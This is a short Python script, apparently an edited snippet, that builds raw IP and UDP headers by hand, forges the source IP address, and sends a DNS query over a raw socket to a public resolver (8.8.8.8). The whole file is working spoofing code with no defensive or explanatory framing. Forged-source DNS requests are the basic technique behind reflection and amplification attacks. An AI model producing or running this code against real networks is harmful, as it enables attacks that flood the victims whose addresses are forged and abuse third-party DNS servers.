import socket
import struct
import random

def calculate_checksum(data):  # Renamed the function here
    """
    Calculate the Internet Checksum of the supplied data.
    """
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_ip_header(src_ip, dest_ip, packet_len):
    """
    Create a custom IP header with a spoofed source IP.
    """
    version = 4
    ihl = 5  # Internet Header Length
    tos = 0
    total_length = packet_len
    packet_id = random.randint(0, 65535)
    flags_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    checksum = 0  # initial checksum
    src_ip = socket.inet_aton(src_ip)
    dest_ip = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (version << 4) + ihl,
                            tos,
                            total_length,
                            packet_id,
                            flags_offset,
                            ttl,
                            protocol,
                            checksum,
                            src_ip,
                            dest_ip)
    
    checksum = calculate_checksum(ip_header)  # Updated to use the renamed function
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (version << 4) + ihl,
                            tos,
                            total_length,
                            packet_id,
                            flags_offset,
                            ttl,
                            protocol,
                            checksum,
                            src_ip,
                            dest_ip)
    
    return ip_header

def create_udp_header(src_port, dest_port, udp_len, checksum):
    """
    Create a custom UDP header.
    """
    return struct.pack('!HHHH', src_port, dest_port, udp_len, checksum)

def create_dns_query(domain):
    """
    Create a DNS query for the given domain.
    """
    transaction_id = random.randint(0, 65535)
    flags = 0x0100  # Standard query with recursion desired
    qdcount = 1  # One question
    ancount = 0
    nscount = 0
    arcount = 0

    header = struct.pack('!HHHHHH', transaction_id, flags, qdcount, ancount, nscount, arcount)
    
    # Question section
    qname = b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.')) + b'\x00'
    qtype = 1  # Type A
    qclass = 1  # IN (Internet)
    question = qname + struct.pack('!HH', qtype, qclass)
    
    return header + question

def send_spoofed_dns_request(fake_src_ip, target_dns_ip, target_domain):
    """
    Send a spoofed DNS request to a DNS server.
    """
    # Set up parameters
    src_port = random.randint(1024, 65535)
    dest_port = 53
    domain_query = create_dns_query(target_domain)
    
    # Calculate lengths
    udp_length = 8 + len(domain_query)
    ip_length = 20 + udp_length

    # Create headers
    ip_header = create_ip_header(fake_src_ip, target_dns_ip, ip_length)
    udp_header = create_udp_header(src_port, dest_port, udp_length, 0)
    
    # Build pseudo header for UDP checksum
    pseudo_header = struct.pack('!4s4sBBH',
                                socket.inet_aton(fake_src_ip),
                                socket.inet_aton(target_dns_ip),
                                0,
                                socket.IPPROTO_UDP,
                                udp_length)
    
    checksum_data = pseudo_header + udp_header + domain_query
    udp_checksum = calculate_checksum(checksum_data)
    
    # Recreate UDP header with the calculated checksum
    udp_header = create_udp_header(src_port, dest_port, udp_length, udp_checksum)
    
    # Final packet
    packet = ip_header + udp_header + domain_query

    # Send the packet using a raw socket
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as sock:
        sock.sendto(packet, (target_dns_ip, 0))
    print("Spoofed DNS request sent.")

# Usage
fake_src_ip = "192.168.1.100"  # Spoofed source IP address
target_dns_ip = "8.8.8.8"       # Destination DNS server
target_domain = "example.com"    # Domain to query

send_spoofed_dns_request(fake_src_ip, target_dns_ip, target_domain)
